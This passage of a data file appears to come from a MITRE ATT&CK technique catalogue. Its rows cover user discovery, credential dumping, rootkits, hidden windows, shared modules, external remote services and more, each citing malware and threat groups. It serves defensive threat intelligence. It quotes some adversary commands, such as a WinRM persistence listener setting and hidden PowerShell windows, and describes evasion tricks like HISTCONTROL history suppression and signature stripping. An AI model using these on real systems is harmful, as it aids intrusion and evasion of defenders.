username on the compromised host.', ""[Neoichor] can collect the user name from a victim's machine."", ""[Goopy] has the ability to enumerate the infected system's user name."", '[MoonWind] obtains the victim username.', '[FunnyDream] has the ability to gather user information from the targeted system using `whoami/upn&whoami/fqdn&whoami/logonid&whoami/all`.', '[Small Sieve] can obtain the id of a logged in user.', '[Egregor] has used tools to gather information about users.', '[njRAT] enumerates the current user during the initial infection.', '[Chimera] has used the <code>quser</code> command to show currently logged on users. ', '[SMOKEDHAM] has used <code>whoami</code> commands to identify system owners.', '[yty] collects the victim’s username.', '[RCSession] can gather system owner information, including user and administrator privileges.', '[NGLite] will run the <code>whoami</code> command to gather system information and return this to the command and control server.', '[Patchwork] collected the victim username and whether it was running as admin, then sent the information to its C2 server.', '[SocGholish] can use `whoami` to obtain the username from a compromised host.', '[Stealth Falcon] malware gathers the registered user and primary owner name via WMI.', '[DnsSystem] can use the Windows user name to create a unique identification for infected users and systems.', ' [Volt Typhoon] has executed the PowerShell command `Get-EventLog security -instanceid 4624` to identify associated user and computer account names.', ""[Linux Rabbit] opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. "", '[Gelsemium] has the ability to distinguish between a standard user and an administrator on a compromised host.', '[LuminousMoth] has used a malicious DLL to collect the username from compromised hosts.', '[Spark] has run the whoami command and has a built-in command to identify the user logged in. ', '[NOKKI] can collect the username from the victim’s machine.', '[SDBbot] has the ability to identify the user on a compromised host.', '[Flagpro] has been used to run the <code>whoami</code> command on the system.', '[Mis-Type] runs tests to determine the privilege level of the compromised user.', '[Mafalda] can collect the username from a compromised host.', ""A [Gamaredon Group] file stealer can gather the victim's username to send to a C2 server."", '[T9000] gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.', '[GALLIUM] used <code>whoami</code> and <code>query user</code> to obtain information about the victim user.', '[RTM] can obtain the victim username and permissions.', '[ServHelper] will attempt to enumerate the username of the victim.', '[Wizard Spider] has used ""whoami"" to identify the local user and their privileges.', '[RGDoor] executes the <code>whoami</code> on the victim’s machine.', '[APT41] has executed <code>whoami</code> commands, including using the WMIEXEC utility to execute this on remote machines.', 'A Linux version of [Derusbi] checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. [Derusbi] also gathers the username of the victim.', '[WinMM] uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.', '[OilRig] has run <code>whoami</code> on a victim.', '[Denis] enumerates and collects the username from the victim’s machine.', '[Bazar] can identify the username of the infected user.', ""[EVILNUM] can obtain the username from the victim's machine."", '[HEXANE] has run `whoami` on compromised machines to identify the current user.', '[zwShell] can obtain the name of the logged-in user on the victim.', '[RedLeaves] can obtain information about the logged on user both locally and for Remote Desktop sessions.', '[GravityRAT] collects the victim username along with other account information (account type, description, full name, SID and status).', '[HotCroissant] has the ability to collect the username on the infected host.', ""[Caterpillar WebShell] can obtain a list of user accounts from a victim's machine."", '[PyDCrypt] has probed victim machines with <code>whoami</code> and has collected the username from the machine.', '[PowerShower] has the ability to identify the current user on the infected host.', '[ROKRAT] can collect the username from a compromised host.', '[ObliqueRAT] can check for blocklisted usernames on infected endpoints.', '[Windshift] has used malware to identify the username on a compromised host.', '[MirageFox] can gather the username from the victim’s machine.', ""[Metamorfo] has collected the username from the victim's machine. "", '[Remsec] can obtain information about the current user.', '[MuddyWater] has used malware that can collect the victim’s username.', '[BoomBox] can enumerate the username on a compromised host.', ""[Gazer] obtains the current user's security identifier."", '[Backdoor.Oldrea] collects the current username from the victim.', '[LiteDuke] can enumerate the account name on a targeted system.', '[Get2] has the ability to identify the current username of an infected host.', '[SUNBURST] collected the username from a compromised host.', '[ZxxZ] can collect the username from a compromised host.', '[Amadey] has collected the user name from a compromised host using `GetUserNameA`.', '[FELIXROOT] collects the username from the victim’s machine.', '[Bonadan] has discovered the username of the user running the backdoor.', '[Clambling] can identify the username on a compromised host.', '[Ixeshe] collects the username from the victim’s machine.', '[Saint Bot] can collect the username from a compromised host.', ""[Reaver] collects the victim's username."", '[VERMIN] gathers the username from the victim’s machine.', '[Dragonfly] used the command <code>query user</code> on victim hosts.', '[Cryptoistic] can gather data on the user of a compromised host.', ' [Action RAT] has the ability to collect the username from an infected host.', '[Chrommme] can retrieve the username from a targeted system.', '[DarkComet] gathers the username from the victim’s machine.', '[BISCUIT] has a command to gather the username from the system.', '[SILENTTRINITY] can gather a list of logged on users. ', '[Sandworm Team] has collected the username from a compromised host.', '[CreepySnail] can execute `getUsername` on compromised systems.', ""[More_eggs] has the capability to gather the username from the victim's machine."", '[DarkWatchman] has collected the username from a victim machine.', 'During [Frankenstein] the threat actors used [Empire] to enumerate hosts and gather username, machine name, and administrative permissions information.', '[SHARPSTATS] has the ability to identify the username on the compromised host.', '[NanHaiShu] collects the username from the victim.', '[Empire] can enumerate the username on targeted hosts.', '[KOPILUWAK] can conduct basic network reconnaissance on the victim machine with `whoami`, to get user details.', '[BlackCat] can utilize `net use` commands to discover the user name on a compromised host.', '[Sidewinder] has used tools to identify the user of a compromised host.', '[QUADAGENT] gathers the victim username.', 'A module in [Prikormka] collects information from the victim about the current user name.', 'An [APT3] downloader uses the Windows command <code>""cmd.exe"" /C whoami</code> to verify that it is running with the elevated privileges of “System.”', '[Sys10] collects the account name of the logged-in user and sends it to the C2.', '[Frankenstein] has enumerated hosts, gathering username, machine name, and administrative permissions information.', '[Operation Wocao] has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.', '[Dragonfly 2.0] used the command <code>query user</code> on victim hosts.', 'APT28 has queried information on machines to determine the current user or system owner .']",False
T1583,Acquire Infrastructure,"Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost. Additionally, botnets are available for rent or purchase.  Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy] including from residential proxy services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",['[Sandworm Team] used various third-party email campaign management services to deliver phishing emails.'],False
T1613,Container and Resource Discovery,"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.  These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ","['[Peirates] can enumerate Kubernetes pods in a given namespace.', '[TeamTNT] has checked for running containers with <code>docker ps</code> and for specific container names with <code>docker inspect</code>. [TeamTNT] has also searched for Kubernetes pods running in a local network.', '[Hildegard] has used masscan to search for kubelets and the kubelet API for additional running containers. ']",False
T1143,Hidden Window,"Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.  ### Windows There are a variety of features in scripting languages in Windows, such as [PowerShell] Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.    ### Mac The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window. ",[],True
T1161,LC_LOAD_DYLIB Addition,Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies . There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time .,[],True
T1150,Plist Modification,"Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges).  Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. ",[],True
T1148,HISTCONTROL,"The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",[],True
T1592,Gather Victim Host Information,"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information] Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Supply Chain Compromise] or [External Remote Services]",[],
T1003,OS Credential Dumping,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures. Credentials can then be used to perform [Lateral Movement] and access restricted information.  Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well. ","['[APT39] has used different versions of Mimikatz to obtain credentials.', '[Carbanak] obtains Windows logon password details.', '[Revenge RAT] has a plugin for credential harvesting.', '[PinchDuke] steals credentials from compromised hosts. [PinchDuke] credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by [PinchDuke] include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).', '[Poseidon Group] conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.', '[OnionDuke] steals credentials from its victims.', '[Tonto Team] has used a variety of credential dumping tools. ', '[APT32] used GetPassword_x64 to harvest credentials.', '[HOMEFRY] can perform credential dumping.', '[Suckfly] used a signed credential-dumping tool to obtain victim account credentials.', '[Trojan.Karagany] can dump passwords and save them into <code>\\ProgramData\\Mail\\MailAg\\pwds.txt</code>.', '[APT28] regularly deploys both publicly available (ex: [Mimikatz] and custom password retrieval tools on victims.\t', '[Sowbug] has used credential dumping tools.', '[Axiom] has been known to dump credentials.', '[Leviathan] has used publicly available tools to dump password hashes, including [HOMEFRY]', ""[Frankenstein] has harvested credentials from the victim's machine using [Empire]"", '[KONNI] can steal profiles (containing credential information) from Firefox, Chrome, and Opera.', '[Azorult] can dump credentials from victim browsers.', 'APT34 has dumped credentials from victims in several ways, including by using open source tools Mimikatz and Lazagne, or by harvesting credentials when users log into Outlook Web Access.', 'Dragonfly dropped and executed SecretsDump, a tool that dumps password hashes.']",False
T1129,Shared Modules,"Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API]  Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.  The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.  The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API] which is called from functions like `LoadLibrary` at run time.","['[gh0st RAT] can load DLLs into memory.', '[Hydraq] creates a backdoor through which remote attackers can load and call DLL functions.', '[PUNCHBUGGY] can load a DLL using the LoadLibrary API.', '[Stuxnet] calls LoadLibrary then executes exports from a DLL.', '[Astaroth] uses the LoadLibraryExW() function to load additional modules. ', '[KillDisk] loads and executes functions from a DLL.', '[Metamorfo] had used AutoIt to load and execute the DLL payload. ', '[DarkWatchman] can load DLLs.', '[Attor] dispatcher can execute additional plugins by loading the respective DLLs.', '[FoggyWeb] loader can call the <code>load()</code> function to load the [FoggyWeb] dll into an Application Domain on a compromised AD FS server.', '[RotaJakiro] uses dynamically linked shared libraries (`.so` files) to execute additional functionality using `dlopen()` and `dlsym()`.', '[BLINDINGCAN] has loaded and executed DLLs in memory during runtime on a victim machine.', ' [Bumblebee] can use `LoadLibrary` to attempt to execute GdiPlus.dll.', '[TajMahal] has the ability to inject the <code>LoadLibrary</code> call template DLL into running processes.', '[BOOSTWRITE] has used the DWriteCreateFactory() function to load additional modules.', '[Dtrack] contains a function that calls <code>LoadLibrary</code> and <code>GetProcAddress</code>.', 'For network communications, [OSX_OCEANLOTUS.D] loads a dynamic library (`.dylib` file) using `dlopen()` and obtains a function pointer to execute within that shared library using `dlsym()`.', '[PipeMon] has used call to <code>LoadLibrary</code> to load its installer. [PipeMon] loads its modules using reflective loading or custom shellcode.']",False
T1602,Data from Configuration Repository,"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.  Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.",[],False
T1492,Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.   Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",[],True
T1006,Direct Volume Access,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools.   Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl] to create shadow copies or backups of data from system volumes.","['[esentutl] can use the Volume Shadow Copy service to copy locked files such as `ntds.dit`.', '[Scattered Spider] has created volume shadow copies of virtual domain controller disks to extract the `NTDS.dit` file.']",False
T1044,File System Permissions Weakness,"Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.  Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ### Services  Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.  ### Executable Installers  Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking] Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control] Several examples of this weakness in existing common installers have been reported to software vendors.  ",[],True
T1171,LLMNR/NBT-NS Poisoning and Relay,"Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.    Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing] and crack the hashes offline through [Brute Force] to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.   Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder]   ",[],True
T1014,Rootkit,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.    Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware]  Rootkits have been seen for Windows, Linux, and Mac OS X systems.  ","['[Ebury] has used user mode rootkit techniques to remain hidden on the system.', '[Winnti Group] used a rootkit to modify typical server functionality.', '[APT41] deployed rootkits on Linux systems.', '[Rocke] has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.', '[Carberp] has used user mode rootkit techniques to remain hidden on the system.', '[Ramsay] has included a rootkit to evade defenses.\t', '[Drovorub] has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.', '[HTRAN] can install a rootkit to hide network connections from the host OS.', '[HIDEDRV] is a rootkit that hides certain operating system artifacts.', '[TeamTNT] has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine. ', '[Skidmap] is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.', '[Umbreon] hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.', '[Stuxnet] uses a Windows rootkit to mask its binaries and other relevant files.', '[COATHANGER] hooks or replaces multiple legitimate processes and other functions on victim devices.', '[Hacking Team UEFI Rootkit] is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.', '[HiddenWasp] uses a rootkit to hook and implement functions on the system.', '[Hildegard] has modified /etc/ld.so.preload to overwrite readdir() and readdir64().', '[APT28] has used a UEFI (Unified Extensible Firmware Interface) rootkit known as [LoJax]', '[Hikit] is a [Rootkit] that has been used by [Axiom]  ', ""[Winnti for Linux] has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity."", '[Zeroaccess] is a kernel-mode rootkit.', '[LoJax] is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.', ""[Uroburos] can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components."", '[WarzoneRAT] can include a rootkit to hide processes, files, and startup.', '[Caterpillar WebShell] has a module to use a rootkit on a system. ', '[PoisonIvy] starts a rootkit from a malicious file dropped to disk.', 'starts a rootkit from a malicious file dropped to disk.']",False
T1501,Systemd Service,"Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.  Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands.   * ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start.  * ExecReload directive covers when a service restarts.  * ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.  Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.  While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.","['[Fysbis] has established persistence using a systemd service. ', '[Exaramel for Linux] has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.', '[Pupy] can be used to establish persistence using a systemd service.']",True
T1514,Elevated Execution with Prompt,"Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.  Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. This technique may be combined with [Masquerading] to trick the user into granting escalated privileges to malicious code. This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.",[],True
T1123,Audio Capture,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.  Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.","['[Flame] can record audio using any existing hardware recording devices.', '[ROKRAT] has an audio capture and eavesdropping module.', '[Bandook] has modules that are capable of capturing audio.', '[PowerSploit] <code>Get-MicrophoneAudio</code> Exfiltration module can record system microphone audio.', '[VERMIN] can perform audio capture.', '[TajMahal] has the ability to capture VoiceIP application audio on an infected host.', '[Pupy] can record sound with the microphone.', '[EvilGrab] has the capability to capture audio from a victim machine.', '[Cadelspy] has the ability to record audio from the compromised host.', '[NanoCore] can capture audio feeds from the system.', '[Crimson] can perform audio surveillance using microphones.', '[MacMa] has the ability to record audio.', '[T9000] uses the Skype API to record audio and video calls. It writes encrypted data to <code>%APPDATA%\\Intel\\Skype</code>.', '[Machete] captures audio from the computer’s microphone.', '[Janicab] captured audio and sent it out to a C2 server.', '[Cobian RAT] has a feature to perform voice recording on the victim’s machine.', '[InvisiMole] can record sound using input audio devices.', '[Revenge RAT] has a plugin for microphone interception.', '[Derusbi] is capable of performing audio captures.', ""[DarkComet] can listen in to victims' conversations through the system’s microphone."", '[MacSpy] can record the sounds from microphones on a computer.', '[Imminent Monitor] has a remote microphone monitoring capability.', ""[DOGCALL] can capture microphone data from the victim's machine."", '[jRAT] can capture microphone recordings.', '[Remcos] can capture data from the system’s microphone.', '[Micropsia] can perform microphone recording.', '[NightClub] can load a module to leverage the LAME encoder and `mciSendStringW` to control and capture audio.', '[APT37] has used an audio capturing utility known as SOUNDWAVE that captures microphone input.', '[Attor] has a plugin that is capable of recording audio using available input sound devices.']",False
T1543,Create or Modify System Process,"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as [Launch Daemon] and [Launch Agent] are run to finish system initialization and load user specific parameters.   Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.    Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.  ","['[Exaramel for Linux] has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.', '[LITTLELAMB.WOOLTEA] can initialize itself as a daemon to run persistently in the background.', '[MiniDuke] can create a process on a compromised host.', '[FatDuke] has the ability to create a process.']",False
T1133,External Remote Services,"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management] and [VNC] can also be used externally.  Access to [Valid Accounts] to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.  Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.","['[TeamTNT] has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. [TeamTNT] has also targeted exposed kubelets for Kubernetes environments.', '[FIN13] has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).', 'During [Operation CuckooBees] the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: `cscript //nologo ""C:\\Windows\\System32\\winrm.vbs"" set winrm/config/service@{EnableCompatibilityHttpsListener=""true""}`.', '[Linux Rabbit] attempts to gain access to the server via SSH.', 'During [Night Dragon] threat actors used compromised VPN accounts to gain access to victim systems.', '[Mafalda] can establish an SSH connection from a compromised host to a server.', '[APT18] actors leverage legitimate credentials to log into external remote services.', ""[Sandworm Team] has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. [Sandworm Team] has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users."", '[Hildegard] was executed through an unsecure kubelet that allowed anonymous access to the victim environment.', '[Scattered Spider] has leveraged legitimate remote management tools to maintain persistent access.', '[APT41] compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service. ', '[LAPSUS$] has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. ', '[OilRig] uses remote services such as VPN, Citrix, or OWA to persist in an environment.', '[GALLIUM] has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.', '[Ke3chang] has gained access through VPNs including with compromised accounts and stolen VPN certificates.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] installed a modified Dropbear SSH client as the backdoor to target systems. ', '[Wizard Spider] has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.', '[APT29] has used compromised identities to access networks via VPNs and Citrix.', 'During [CostaRicto] the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.', '[Kimsuky] has used RDP to establish persistence.', '[FIN5] has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.', 'For the [SolarWinds Compromise] [APT29] used compromised identities to access networks via SSH, VPNs, and other remote access tools.', '[Threat Group-3390] actors look for and use VPN profiles during an operation to access the network using external VPN services. [Threat Group-3390] has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.', '[Kinsing] was executed in an Ubuntu container deployed via an open Docker daemon API.', 'During [C0027] [Scattered Spider] used Citrix and VPNs to persist in compromised environments.', '[GOLD SOUTHFIELD] has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.\t', '[Chimera] has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.', 'During the [C0032] campaign, [TEMP.Veles] used VPN access to persist in the victim environment.', '[Dragonfly] has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.', '[Akira] uses compromised VPN accounts for initial access to victim networks.', '[APT28] has used [Tor] and a variety of commercial VPN services to route brute force authentication attempts.', ""During [Operation Wocao] threat actors used stolen credentials to connect to the victim's network via VPN."", '[Doki] was executed through an open Docker daemon API port.', '[Leviathan] has used external remote services such as virtual private networks (VPN) to gain initial access.', '[TEMP.Veles] has used a VPN to persist in the victim environment.', '[UNC2452] has used compromised identities to access VPNs and remote access tools.', '[Night Dragon] has used compromised VPN accounts to gain access to victim systems.', ""[Operation Wocao] has used stolen credentials to connect to the victim's network via VPN."", '[Dragonfly 2.0] used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.', 'Dragonfly used remote access services, including VPN and Outlook Web Access (OWA).', 'APT34 uses remote services such as VPN, Citrix, or OWA to persist in an environment.']",False
T1109,Component Firmware,"Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware] but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",['[Equation] is known to have the capability to overwrite the firmware on hard drives from some manufacturers.'],True
